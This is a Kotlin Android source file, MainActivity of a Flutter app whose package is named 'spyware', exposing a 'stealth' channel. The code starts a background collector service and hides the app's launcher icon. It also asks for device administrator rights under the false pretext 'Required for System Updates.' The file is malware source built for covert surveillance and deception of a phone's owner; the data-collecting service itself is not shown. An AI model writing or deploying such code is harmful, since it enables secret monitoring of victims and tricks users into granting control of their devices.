package com.example.spyware

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.app.admin.DevicePolicyManager
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class MainActivity : FlutterActivity() {
    private val CHANNEL = "com.example.spyware/stealth"

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "startService" -> {
                    CollectorService.start(this)
                    result.success("Service Started")
                }
                "hideIcon" -> {
                    val p = packageManager
                    val componentName = ComponentName(this, MainActivity::class.java)
                    p.setComponentEnabledSetting(
                        componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                    result.success("Icon Hidden")
                }
                "requestAdmin" -> {
                    val componentName = ComponentName(this, AdminReceiver::class.java)
                    val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                        putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                        putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for System Updates.")
                    }
                    startActivity(intent)
                    result.success("Admin Requested")
                }
                else -> result.notImplemented()
            }
        }
    }
}